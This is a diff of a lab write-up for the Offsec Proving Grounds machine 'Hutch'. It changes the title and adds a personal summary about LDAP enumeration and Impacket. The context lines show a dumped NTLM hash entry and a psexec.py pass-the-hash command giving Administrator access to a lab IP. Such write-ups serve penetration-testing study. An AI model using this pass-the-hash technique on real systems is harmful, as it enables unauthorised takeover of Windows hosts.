@@ -1,5 +1,5 @@
 ---
-title: Offsec PG Hutch (Writeup)
+title: Writeup - Offsec PG Hutch
 date: 2023-09-25  
 author: kei5uke
 description: Writeup for PG Hutch 
@@ -263,3 +263,9 @@ HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:151657b4aa87d85cebc0543e9d1f095b:
 `psexec.py Administrator@192.168.175.122 -hashes aad3b435b51404eeaad3b435b51404ee:333078b4951591731a68da1d3fb53cdb`
 
 ![Screenshot 2023-09-26 at 01.04.32.png](Hutch%20aac63fefd54b41fd85acd5e7ed833711/Screenshot_2023-09-26_at_01.04.32.png)
+
+# Summary 
+Cracking Windows machines has always posed a challenge for me. In this instance, the LDAP protocol emerged as the pivotal factor in gaining access to critical information. I delved into the world of Impacket scripts for robust Active Directory enumeration and mastered the intricacies of psexec.
+
+Having rooted nearly 30 machines on the proving ground, I'm left with the sense that there are still protocols waiting to be unraveled. I'm determined to keep honing my skills until I feel completely at ease with any protocol I encounter.
+
